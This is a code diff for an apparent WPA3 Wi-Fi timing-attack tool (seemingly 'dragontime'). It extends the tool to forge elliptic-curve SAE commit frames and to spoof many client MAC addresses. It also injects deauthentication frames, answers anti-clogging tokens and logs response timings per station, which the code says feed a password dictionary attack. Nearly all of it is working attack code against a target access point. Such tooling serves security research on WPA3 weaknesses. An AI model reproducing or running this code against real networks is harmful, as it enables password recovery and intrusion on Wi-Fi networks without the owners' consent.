@@ -28,6 +28,11 @@
 #include <signal.h>
 #include <poll.h>
 #include <assert.h>
+#include <time.h>
+
+#include <openssl/evp.h>
+#include <openssl/ec.h>
+#include <openssl/bn.h>
 
 #include "aircrack-osdep/osdep.h"
 #include "aircrack-osdep/network.h"
@@ -50,7 +55,19 @@
 
 #define USED_RATE RATE_54M
 
-// TODO: Share this in another file between clogger.c
+unsigned char AUTH_REQ_SAE_COMMIT_ECC_HEADER[] = 
+	/* 802.11 header */ \
+	"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
+	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"                                 \
+	/* SAE Commit frame */                                             \
+	"\x03\x00\x01\x00\x00\x00";
+	// Next is:
+	// 2-bytes for the group id
+	// scalar
+	// x coordinate
+	// y coordinate
+size_t AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_ECC_HEADER) - 1;
+
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_22[] = 
 	/* 802.11 header */ \
 	"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
@@ -124,7 +141,6 @@ unsigned char AUTH_REQ_SAE_COMMIT_GROUP_23[] =
 size_t AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_23) - 1;
 
 
-// TODO: Share this in another file between clogger.c
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_24[] = 
 	/* 802.11 header */ \
 	"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
@@ -175,10 +191,17 @@ unsigned char DEAUTH_FRAME[] =
 	"\x2c\xb0\x5d\x5b\xd2\x65\x60\x5f\x03\x00";
 size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;
 
-static void sighandler(int signum)
-{
-	if (signum == SIGPIPE) printf("broken pipe!\n");
-}
+struct state_ecc {
+	const EC_GROUP *group;
+	const EC_POINT *generator;
+	EC_POINT *element;
+	BIGNUM *prime;
+	BIGNUM *a;
+	BIGNUM *b;
+	BIGNUM *order;
+	BN_CTX *bnctx;
+	BIGNUM *scalar;
+};
 
 static struct state
 {
@@ -187,6 +210,8 @@ static struct state
 	unsigned char srcaddr[6];
 	int debug_level;
 	int group;
+	const char *output_file;
+	FILE *fp;
 
 	// Timing specific
 	struct timespec prev_commit;
@@ -198,12 +223,33 @@ static struct state
 	int num_addresses;
 
 	// TODO: Are these still needed?
-	int started_clogging;
-	int rate;
-	int interval;
+	int started_attack;
+	int delay;
+	int timeout;
+
+	// Elliptic curve crypto
+	struct state_ecc ecc;
 } _state;
 
 static struct state * get_state(void) { return &_state; }
+
+static void sighandler(int signum)
+{
+	struct state *state = get_state();
+
+	if (signum == SIGPIPE || signum == SIGINT)
+	{
+		time_t t = time(NULL);
+		struct tm tm = *localtime(&t);
+
+		if (state->fp != NULL)
+			fprintf(state->fp, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+		else
+			printf("Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+
+		exit(0);
+	}
+}
 
 static void debug(struct state *state, int level, char *fmt, ...)
 {
@@ -251,27 +297,11 @@ card_write(struct state *state, void *buf, int len, struct tx_info *ti)
 	return wi_write(state->wi, buf, len, ti);
 }
 
-#if 0
-static int card_get_mac(struct state *state, unsigned char * mac)
+static inline int card_get_mac(struct state *state, unsigned char * mac)
 {
 	return wi_get_mac(state->wi, mac);
 }
 
-static int card_get_monitor(struct state *state)
-{
-	return wi_get_monitor(state->wi);
-}
-
-static int card_get_rate(struct state *state)
-{
-	return wi_get_rate(state->wi);
-}
-
-static int card_get_chan(struct state *state)
-{
-	return wi_get_channel(state->wi);
-}
-#endif
 
 static void
 open_card(struct state *state, char * dev, int chan)
@@ -282,23 +312,97 @@ open_card(struct state *state, char * dev, int chan)
 	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
 }
 
-static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
+// TODO: Share with dragondrain
+int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen)
 {
-	unsigned char *buf;
-	int len;
+	int num_bytes = BN_num_bytes(num);
+	int offset = outlen - num_bytes;
+
+	memset(buf, 0, offset);
+	BN_bn2bin(num, buf + offset);
+
+	return 0;
+}
+
+// TODO: Share with dragondrain
+uint8_t * ecc_point2bin(struct state *state, EC_POINT *point, uint8_t *out)
+{
+	int num_bytes = BN_num_bytes(state->ecc.prime);
+	BIGNUM *bignum_x = BN_new();
+	BIGNUM *bignum_y = BN_new();
+	// XXX check allocation results
+
+	// XXX check return value
+	EC_POINT_get_affine_coordinates_GFp(state->ecc.group, point, bignum_x, bignum_y, state->ecc.bnctx);
+
+	// XXX check if out buffer is large enough
+	bignum2bin(bignum_x, out, num_bytes);
+	bignum2bin(bignum_y, out + num_bytes, num_bytes);
+
+	BN_free(bignum_y);
+	BN_free(bignum_x);
+
+	return out + 2 * num_bytes;
+}
+
+
+static size_t generate_sae_commit_ecc(struct state *state, uint8_t *buf, size_t len)
+{
+	uint8_t *pos = buf;
+
+	// Copy the header
+	memcpy(pos, AUTH_REQ_SAE_COMMIT_ECC_HEADER, AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE);
+	pos += AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE;
+
+	// Fill in the group number
+	uint16_t *commit_groupid = (uint16_t*)pos;
+	*commit_groupid = state->group;
+	pos += 2;
+
+	// Copy the scalar
+	int num_bytes = BN_num_bytes(state->ecc.prime);
+	bignum2bin(state->ecc.scalar, pos, num_bytes);
+	pos += num_bytes;
+
+	// Copy the element
+	pos = ecc_point2bin(state, state->ecc.element, pos);
+
+	// Return the length of the constructed frame
+	return pos - buf;
+}
+
+static void inject_sae_commit(struct state *state)
+{
+	unsigned char buf[2048] = {0};
+	int len= 0;
+
+	if (!state->started_attack)
+		return;
+	debug(state, 2, "Injecting commit frame using group %d\n", state->group);
 
 	switch (state->group) {
 	case 22:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_22;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
 		break;
 	case 23:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_23;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
 		break;
 	case 24:
-		buf = AUTH_REQ_SAE_COMMIT_GROUP_24;
 		len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
+		memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
+		break;
+	case 19:
+	case 20:
+	case 21:
+	case 25:
+	case 26:
+	case 27:
+	case 28:
+	case 29:
+	case 30:
+		len = generate_sae_commit_ecc(state, buf, sizeof(buf));
 		break;
 	default:
 		debug(state, 1, "Internal error: unsupported group %d in %s\n", state->group, __FUNCTION__);
@@ -306,7 +410,7 @@ static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 	}
 
 	memcpy(buf + 4, state->bssid, 6);
-	memcpy(buf + 10, srcaddr, 6);
+	memcpy(buf + 10, state->srcaddr, 6);
 	memcpy(buf + 16, state->bssid, 6);
 
 	if (card_write(state, buf, len, NULL) == -1)
@@ -314,15 +418,6 @@ static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 
 	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
 	state->got_reply = 0;
-}
-
-static void inject_commits(struct state *state)
-{
-	if (!state->started_clogging)
-		return;
-
-	debug(state, 2, "Injecting commit frame using group %d\n", state->group);
-	inject_sae_commit(state, state->srcaddr);
 }
 
 static void inject_deauth(struct state *state)
@@ -344,7 +439,7 @@ static void queue_next_commit(struct state *state)
 
 	/* initial expiration of the timer */
 	timespec.it_value.tv_sec = 0;
-	timespec.it_value.tv_nsec = 500 * 1000 * 1000;
+	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;
 	/* periodic expiration of the timer */
 	timespec.it_interval.tv_sec = 0;
 	timespec.it_interval.tv_nsec = 0;
@@ -357,7 +452,7 @@ static void check_timeout(struct state *state)
 {
 	struct timespec curr, diff;
 
-	if (!state->started_clogging)
+	if (!state->started_attack)
 		return;
 
 	clock_gettime(CLOCK_MONOTONIC, &curr);
@@ -369,7 +464,7 @@ static void check_timeout(struct state *state)
 		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
 	}
 
-	if (diff.tv_nsec > 750 * 1000 * 1000) {
+	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
 		debug(state, 2, "Detected timeout, deauthenticating and queuing next commit\n");
 
 		inject_deauth(state);
@@ -383,9 +478,11 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 
 	//printf("process_packet: %d\n", len);
 
-	/* Ignore retransmitted frames - TODO improve */
-	if (buf[1] & 0x08)
+	/* Ignore retransmitted frames - TODO: Inject new commit if the reply was retransmitted */
+	if (buf[1] & 0x08) {
+		//printf("Ignoring retransmission\n");
 		return;
+	}
 
 	/* Extract addresses */
 	switch (buf[1] & 3)
@@ -417,16 +514,23 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
 		return;
 
-	/* Inject commit frames every second */
-	if (buf[0] == 0x80 && !state->started_clogging)
+	/* Detect Beacon - Inject commit frames every second */
+	if (buf[0] == 0x80 && !state->started_attack)
 	{
+		time_t t = time(NULL);
+		struct tm tm = *localtime(&t);
+
 		// TODO: Verify this is a beacon frame
-		printf("Detected AP! Starting clogging ...\n");
+		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
+			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+		fprintf(state->fp, "Starting at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
+			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
 
-		state->started_clogging = 1;
+		state->started_attack = 1;
+		inject_sae_commit(state);
 	}
-
-	if (len > 24 + 8 &&
+	/* Detect Authentication frames */
+	else if (len >= 24 + 8 &&
 		buf[0] == 0xb0 && /* Type is Authentication */
 		buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
 		/*buf[26] == 0x01*/) /* Sequence number is 1 */
@@ -434,14 +538,6 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 		/* Check if status is good and its the first reply */
 		if (buf[28] == 0x00) {
 			struct timespec curr, diff;
-
-			/* Ignore retransmissions - FIXME: It seems aircrack already filters these?! */
-			//printf("%02X %02X .. %02X %02X\n", buf[0], buf[1], buf[22], buf[23]);
-			if ((buf[1] & 0x08) != 0) {
-				debug(state, 2, ">>>>>>>>> Ignore retransmission\n");
-				inject_commits(state);
-				return;
-			}
 
 			clock_gettime(CLOCK_MONOTONIC, &curr);
 			if (curr.tv_nsec > state->prev_commit.tv_nsec) {
@@ -455,9 +551,12 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			state->sum_time[state->curraddr] += diff.tv_nsec;
 			state->num_injected[state->curraddr] += 1;
 
+			// Write measurement to file
+			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);
+
+			// Also provide output to the screen			
 			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
 				state->num_injected[state->curraddr]);
-
 			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
 				printf("-------------------------------\n");
 				for (int i = 0; i < state->num_addresses; ++i)
@@ -475,8 +574,8 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 		{
 			unsigned char *token = buf + 24 + 8;
 			int token_len = len - 24 - 8;
-			unsigned char *reply;
-			size_t reply_len;
+			unsigned char reply[2048] = {0};
+			size_t reply_len = 0;
 
 			//printf("ERROR: Anti-clogging token hit\n");
 			//exit(1);
@@ -484,19 +583,27 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			/* fill in basic frame */
 			switch (state->group) {
 			case 22:	
-				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE + token_len;
-				reply = malloc(reply_len);
-				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_22, AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE);
+				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
+				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_22, reply_len);
 				break;
 			case 23:
-				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE + token_len;
-				reply = malloc(reply_len);
-				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_23, AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE);
+				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
+				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_23, reply_len);
 				break;
 			case 24:
-				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE + token_len;
-				reply = malloc(reply_len);
-				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_24, AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE);
+				reply_len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
+				memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_24, reply_len);
+				break;
+			case 19:
+			case 20:
+			case 21:
+			case 25:
+			case 26:
+			case 27:
+			case 28:
+			case 29:
+			case 30:
+				reply_len = generate_sae_commit_ecc(state, reply, sizeof(reply));
 				break;
 			default:
 				debug(state, 1, "Internal error: unsupported group %d in %s\n", state->group, __FUNCTION__);
@@ -505,8 +612,9 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 
 			/* token comes after status and group id, before scalar and element */
 			int pos = 24 + 8;
-			memmove(reply + pos + token_len, reply + pos, reply_len - pos - token_len);
+			memmove(reply + pos + token_len, reply + pos, reply_len - pos);
 			memcpy(reply + pos, token, token_len);
+			reply_len += token_len;
 
 			/* set addresses */
 			memcpy(reply + 4, state->bssid, 6);
@@ -519,8 +627,13 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			if (card_write(state, reply, reply_len, NULL) == -1)
 				perror("card_write");
 			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
-
-			free(reply);
+		}
+		/* Status equals unsupported group */
+		else if (buf[28] == 0x4d) {
+			printf("WARNING: Authentication rejected due to unsupported group\n");
+		}
+		else {
+			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
 		}
 	}
 }
@@ -548,12 +661,32 @@ static void event_loop(struct state *state, char * dev, int chan)
 	int card_fd, timer_fd;
 	struct itimerspec timespec;
 
+	// 1. Open the card and get the MAC address
 	open_card(state, dev, chan);
 	card_fd = wi_fd(state->wi);
 	card_set_rate(state, USED_RATE);
-	debug(state, 2, "card_fd = %d\n", card_fd);
+	card_get_mac(state, state->srcaddr);
 
+	// 2. Display all info we need to perform the dictionary attack & also write it to file
+	printf("Targeting BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1],
+		state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
+	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
+		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
+	printf("Performing attack using group %d\n", state->group);
+	printf("Using a retransmit timeout of %d ms, and a delay between commits of %d ms\n", state->timeout, state->delay);
 
+	fprintf(state->fp, "BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0],
+		state->bssid[1], state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
+	fprintf(state->fp, "Spoofing %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
+		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
+	fprintf(state->fp, "Group %d\n", state->group);
+	fprintf(state->fp, "Timeout %d\n", state->timeout);
+	fprintf(state->fp, "Delay %d\n", state->delay);
+
+	// 3. Initialize futher things to start the attack
+	state->srcaddr[5] = state->curraddr;
+
+	// 4. Initialize periodic timer to detect timouts
 	timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
 	if (timer_fd == -1)
 		perror("timerfd_create()");
@@ -566,9 +699,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 	timespec.it_interval.tv_sec = 0;
 	timespec.it_interval.tv_nsec = 100 * 1000*1000;
 
-	debug(state, 0, "Interval: %d sec, %d usec\n", timespec.it_interval.tv_sec,
-		timespec.it_interval.tv_nsec);
-
+	// 5. Initialize timer used to queue a new commit frame to inject
 	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
 		perror("timerfd_settime()");
 
@@ -576,8 +707,8 @@ static void event_loop(struct state *state, char * dev, int chan)
 	if (timer_fd == -1)
 		perror("timerfd_create()");
 
+	// 6. Now start the main event loop
 	printf("Searching for AP ...\n");
-
 	while (1)
 	{
 		card_fd = wi_fd(state->wi);
@@ -596,18 +727,143 @@ static void event_loop(struct state *state, char * dev, int chan)
 		if (fds[0].revents & POLLIN)
 			card_receive(state);
 
+		// This timer is periodically called, detects timeouts, and implicity starts the attack
 		if (fds[1].revents & POLLIN) {
 			uint64_t exp;
 			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
 			check_timeout(state);
 		}
 
+		// This timer is set when a new commit is queued after receiving a reply or a timeout
 		if (fds[2].revents & POLLIN) {
 			uint64_t exp;
 			assert(read(state->time_fd_inject, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
-			inject_commits(state);
+			inject_sae_commit(state);
 		}
 	}
+}
+
+// TODO: Share this between dragondrain
+int iana_to_openssl_id(int groupid)
+{
+	switch (groupid) {
+	case 19: return NID_X9_62_prime256v1;
+	case 20: return NID_secp384r1;
+	case 21: return NID_secp521r1;
+	case 25: return NID_X9_62_prime192v1;
+	case 26: return NID_secp224r1;
+	case 27: return NID_brainpoolP224r1;
+	case 28: return NID_brainpoolP256r1;
+	case 29: return NID_brainpoolP384r1;
+	case 30: return NID_brainpoolP512r1;
+	default: return -1;
+	}
+}
+
+// TODO: Share this between dragondrain
+void free_crypto_context(struct state_ecc *state_ecc)
+{
+	BN_free(state_ecc->prime);
+	BN_free(state_ecc->a);
+	BN_free(state_ecc->b);
+	BN_free(state_ecc->order);
+	BN_free(state_ecc->scalar);
+	EC_POINT_free(state_ecc->element);
+	BN_CTX_free(state_ecc->bnctx);
+}
+
+// TODO: Share this between dragondrain
+int initialize_ecc_crypto(struct state_ecc *state_ecc, int group)
+{
+	BIGNUM *randbn;
+	int openssl_groupid;
+
+	openssl_groupid = iana_to_openssl_id(group);
+	if (openssl_groupid == -1) {
+		fprintf(stderr, "Unrecognized curve ID: %d\n", group);
+		return -1;
+	}
+
+	state_ecc->group = EC_GROUP_new_by_curve_name(openssl_groupid);
+	if (state_ecc->group == NULL) {
+		fprintf(stderr, "OpenSSL failed to load curve %d\n", group);
+		return -1;
+	}
+
+	state_ecc->bnctx = BN_CTX_new();
+	state_ecc->prime = BN_new();
+	state_ecc->a = BN_new();
+	state_ecc->b = BN_new();
+	state_ecc->order = BN_new();
+	state_ecc->scalar = BN_new();
+	state_ecc->element = EC_POINT_new(state_ecc->group);
+	if (state_ecc->bnctx == NULL || state_ecc->prime == NULL || state_ecc->a == NULL ||
+	    state_ecc->b == NULL || state_ecc->order == NULL || state_ecc->scalar == NULL ||
+	    state_ecc->element == NULL) {
+		fprintf(stderr, "Failed to allocate memory for BIGNUMs and/or ECC points\n");
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	if (!EC_GROUP_get_curve_GFp(state_ecc->group, state_ecc->prime, state_ecc->a, state_ecc->b, state_ecc->bnctx) ||
+	    !EC_GROUP_get_order(state_ecc->group, state_ecc->order, state_ecc->bnctx)) {
+		fprintf(stderr, "Failed to get parameters of group %d\n", group);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	state_ecc->generator = EC_GROUP_get0_generator(state_ecc->group);
+	if (state_ecc->generator == NULL || state_ecc->element == NULL) {
+		fprintf(stderr, "Failed to get the generator of group %d\n", group);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	randbn = BN_new();
+	if (randbn == NULL) {
+		fprintf(stderr, "Failed to element BIGNUM\n");
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	// For our purposes, a 64-bit random number is more than enough
+	BN_pseudo_rand(randbn, 64, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
+	BN_pseudo_rand(state_ecc->scalar, BN_num_bits(state_ecc->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
+
+	if (!EC_POINT_mul(state_ecc->group, state_ecc->element, NULL, state_ecc->generator, randbn, state_ecc->bnctx)) {
+		fprintf(stderr, "EC_POINT_mul failed\n");
+		BN_free(randbn);
+		free_crypto_context(state_ecc);
+		return -1;
+	}
+
+	printf("Initialized ECC crypto parameters\n");
+
+	BN_free(randbn);
+	return 0;
+}
+
+// FIXME: Share this function between dragontime and dragondrain
+static int is_module_loaded(const char *module)
+{
+	char line[256];
+	FILE *fp = NULL;
+	int loaded = 0;
+
+	fp = fopen("/proc/modules", "r");
+	if (fp == NULL) {
+		fprintf(stderr, "Failed to check if kernel module %s is loaded", module);
+		perror("");
+		return 0;
+	}
+
+	while (!loaded && fgets(line, sizeof(line), fp) != NULL) {
+		loaded = strncmp(line, module, strlen(module)) == 0 &&
+		         line[strlen(module)] == ' ';
+	}
+
+	fclose(fp);
+	return loaded;
 }
 
 static void usage(char * p)
@@ -621,14 +877,15 @@ static void usage(char * p)
 		   "\n"
 		   "  Options:\n"
 		   "\n"
-		   "       -h         : This help screen\n"
-		   "       -d <iface> : Wifi interface to use\n"
-		   "       -c  <chan> : Channel to use\n"
-		   "       -a bssid   : Target Access Point MAC address\n"
-		   "       -g group   : The curve to use (either 19 or 21)\n"
-		   "       -v <level> : Debug level (1 to 3; default: 1)\n"
-		   "       -r <rate>  : Number of commits to inject every interval\n"
-		   "       -i <inter> : Duration of an interval in ms\n"
+		   "       -h           : This help screen\n"
+		   "       -d <iface>   : Wifi interface to use\n"
+		   "       -c  <chan>   : Channel to use\n"
+		   "       -a bssid     : Target Access Point MAC address\n"
+		   "       -o file      : File to write the measurements to\n"
+		   "       -g group     : The curve to use (either 19 or 21)\n"
+		   "       -v <level>   : Debug level (1 to 3; default: 1)\n"
+		   "       -i <inter>   : Delay between two injects in ms\n"
+		   "       -t <timeout> : Timeout in ms to retransmit commit\n"
 		   "\n",
 		   version_info);
 	free(version_info);
@@ -648,11 +905,11 @@ int main(int argc, char * argv[])
 	state->curraddr = 0;
 	state->debug_level = 1;
 	state->group = 24;
-	state->rate = 2;
-	state->interval = 100;
+	state->delay = 250;
+	state->timeout = 750;
 	state->num_addresses = 20;
 
-	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:")) != -1)
+	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:o:")) != -1)
 	{
 		switch (ch)
 		{
@@ -681,20 +938,24 @@ int main(int argc, char * argv[])
 				state->group = atoi(optarg);
 				break;
 
-			case 'r':
-				state->rate = atoi(optarg);
-				if (state->rate < 1) {
-					printf("Please enter a rate above zero\n");
+			case 'i':
+				state->delay = atoi(optarg);
+				if (state->delay < 1) {
+					printf("Please enter an delay above zero\n");
 					return 1;
 				}
 				break;
 
-			case 'i':
-				state->interval = atoi(optarg);
-				if (state->interval < 1) {
-					printf("Please enter an interval above zero\n");
+			case 't':
+				state->timeout = atoi(optarg);
+				if (state->timeout < 1) {
+					printf("Please enter a timeout above zero\n");
 					return 1;
 				}
+				break;
+
+			case 'o':
+				state->output_file = strdup(optarg);
 				break;
 
 			case 'h':
@@ -705,22 +966,52 @@ int main(int argc, char * argv[])
 	}
 
 	signal(SIGPIPE, sighandler);
+	signal(SIGINT, sighandler);
 
+	// Sanity-check the parameters
 	if (!device || chan <= 0 || memcmp(state->bssid, ZERO, 6) == 0)
 		usage(argv[0]);
-	if (state->group != 22 && state->group != 23 && state->group != 24) {
-		fprintf(stderr, "Only group 22, 23, or 24 is supported\n");
+	if ((state->group < 22 || state->group > 24) && initialize_ecc_crypto(&state->ecc, state->group)) {
+		fprintf(stderr, "Group %d is not supported\n", state->group);
+		exit(1);
+	}
+	if (state->output_file == NULL) {
+		fprintf(stderr, "Please provide an output file using the -o parameter\n");
+		exit(1);
+	} else if (access(state->output_file, F_OK) != -1) {
+		fprintf(stderr, "The output file %s already exists\n", state->output_file);
 		exit(1);
 	}
 
-	//memcpy(state->srcaddr, "\x2c\xb0\x5d\x5b\xd2\x65", 6);
-	memcpy(state->srcaddr, "\x00\x8e\xf2\x7d\x8b\x37", 6);
-	state->srcaddr[5] = state->curraddr;
+	state->fp = fopen(state->output_file, "w");
+	if (state->fp == NULL) {
+		fprintf(stderr, "Failed to open %s: ", state->output_file);
+		perror("");
+		exit(1);
+	}
 
-	printf("Using source address %02X:%02X:%02X:%02X:%02X:**\n", state->srcaddr[0], state->srcaddr[1],
-		state->srcaddr[2], state->srcaddr[3], state->srcaddr[4]);
+	// Warn user if spoofed addresses won't be acknowledged
+	// FIXME: Check that the device being used is the Atheros one
+	if (!is_module_loaded("ath")) {
+		printf("\n"
+		       "Warning: please use an Atheros device. This tool was only tested using an\n"
+		       "         Atheros ath9k_htc device, combined with the ath_masker kernel module,\n"
+                       "         so that frames sent to the spoofed MAC addresses are acknowledged\n"
+		       "         by the Wi-Fi chip.\n\n"
+		       "         Press CTRL+C to exit, or enter to coninue...");
+		getc(stdin);
+		printf("\n");
+	}
+	if (is_module_loaded("ath") && !is_module_loaded("ath_masker")) {
+		printf("\n"
+		       "Warning: please load the kernel module ath_masker so frames send to spoofed\n"
+		       "         MAC addresses are acknowledged. Download the module code at\n"
+		       "         https://github.com/vanhoefm/ath_masker\n\n"
+		       "         Press CTRL+C to exit, or enter to coninue...");
+		getc(stdin);
+		printf("\n");
+	}
 
 	event_loop(state, device, chan);
-
 	exit(0);
 }
